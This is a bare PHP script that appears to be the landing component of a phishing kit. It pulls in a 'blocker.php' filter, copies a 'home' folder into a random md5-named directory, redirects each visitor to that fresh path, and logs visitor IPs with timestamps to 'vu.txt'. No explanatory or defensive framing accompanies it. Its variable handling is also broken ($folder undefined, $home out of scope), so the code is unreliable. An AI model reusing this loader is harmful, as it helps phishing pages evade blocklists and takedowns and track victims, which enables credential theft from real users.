<?

include('blocker.php');
$DIR=md5(rand(0,100000000000));
function recurse_copy($folder,$DIR) {
$dir = opendir($folder);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($folder . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="home";
recurse_copy( $folder, $DIR );
header("location:$DIR");
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?> 
